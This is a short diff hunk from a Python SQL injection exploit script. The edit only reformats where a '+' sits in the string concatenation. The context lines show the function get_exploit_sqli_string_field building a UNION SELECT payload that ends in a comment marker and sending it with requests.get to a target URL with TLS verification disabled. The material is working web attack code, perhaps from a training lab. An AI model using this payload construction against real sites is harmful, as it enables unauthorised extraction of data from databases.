@@ -28,8 +28,8 @@ def get_exploit_sqli_string_field(url, num_col):
         payload_list[number-1] = string
         sql_payload = (
             "' union select " + 
-            ','.join(payload_list) 
-            + "--")
+            ','.join(payload_list) + 
+            "--")
         response = requests.get(
             url + uri + sql_payload,
             verify=False,
